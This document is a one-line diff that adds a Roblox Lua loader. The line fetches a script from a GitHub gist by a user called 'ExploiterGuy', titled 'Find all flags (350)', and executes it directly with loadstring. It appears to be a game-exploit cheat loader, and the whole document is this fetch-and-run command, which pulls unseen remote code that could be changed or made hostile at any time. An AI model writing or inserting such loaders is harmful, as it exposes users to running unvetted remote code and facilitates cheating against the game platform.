@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ExploiterGuy/9a8c2e984cda131b94ff11a8884a6beb/raw/3d74d04476481dd13e01aaacd487f92a896ef17d/Find%2520all%2520flags%2520(350)%2520%25F0%259F%258C%258F"))()
